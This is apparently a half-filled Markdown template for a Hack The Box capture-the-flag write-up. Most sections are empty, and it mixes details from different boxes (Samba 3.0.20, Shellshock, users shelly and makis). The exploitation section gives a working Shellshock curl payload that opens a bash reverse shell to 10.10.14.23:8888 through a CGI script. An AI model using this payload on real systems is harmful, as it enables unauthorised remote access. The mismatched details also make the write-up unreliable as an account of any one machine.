---
title: "HTB - Box"
author: "Anubhavsingh Sawdagur"
date: "DATE_NOW"
subject: "Markdown"
subtitle: "10.10.10."
lang: "en-GB"
book: true
classoption: oneside
code-block-font-size: \scriptsize   
output: 
  pdf_document:
    fig_caption: false
---

# Box - 10.10.10.

# Enumeration

## Nmap

```bash
nmap -sC -sV -oA nmap/initial 10.10.10.
```

```bash

```

Searchsploit is used to search for a known exploit the samba version **3.0.20**

```bash

```

# Exploitation


### **Vulnerability Explanation:**


### Getting a reverse shell

The tools used here to generate quick  reverse shell is called [rsg or reverse shell generator](https://github.com/mthbernardes/rsg)

```bash
# generates payload and as well as listens on the specified port
rsg 10.10.14.23 8888 bash 
# make the server connect back to the attacker using shellshock payload with bash reverse shell
curl -H "user-agent: () { :; }; echo; echo; /bin/bash -c 'bash -i >& /dev/tcp/10.10.14.23/8888 0>&1'" "http://10.10.10.56/cgi-bin/user.sh" 
```


### User.txt

```bash
find /home -type f
```

**User.txt** can be found in the home directory of **shelly**.

```bash
cat /home/makis/user.txt
```

> user.txt flag: ``

## Privilege Escalation to Root

### Root.txt

### **Vulnerability Explanation:**

the **root.txt** file is always located in **/root/**

```bash
cat /root/root.txt
```

> root.txt flag: ``

